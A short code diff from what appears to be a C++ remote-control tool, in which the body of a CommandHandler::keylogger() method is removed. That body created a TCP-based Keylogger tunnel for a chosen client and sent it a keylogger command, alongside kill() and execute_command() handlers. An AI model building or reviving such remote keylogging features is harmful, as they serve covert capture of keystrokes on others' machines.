@@ -348,18 +348,7 @@ void CommandHandler::kill() {
 }
 
 void CommandHandler::keylogger() {
-    int client_index = std::any_cast<int>(arg_map_[INDEX_ARG]);
-    Keylogger* keylogger = new Keylogger(
-        p_ip_,
-        p_port_,
-        client_index,
-        p_shutdown_flag_,
-        TCP_BASED,
-        shutdown_event_fd_,
-        &tunnel_shutdown_fds_
-    );
-    p_clients_->at(client_index)->set_tunnel(KEYLOGGER);
-    send_client(KEYLOGGER, 0, client_index);
+    
 }
 
 void CommandHandler::execute_command(char* __cmd, int __len) {
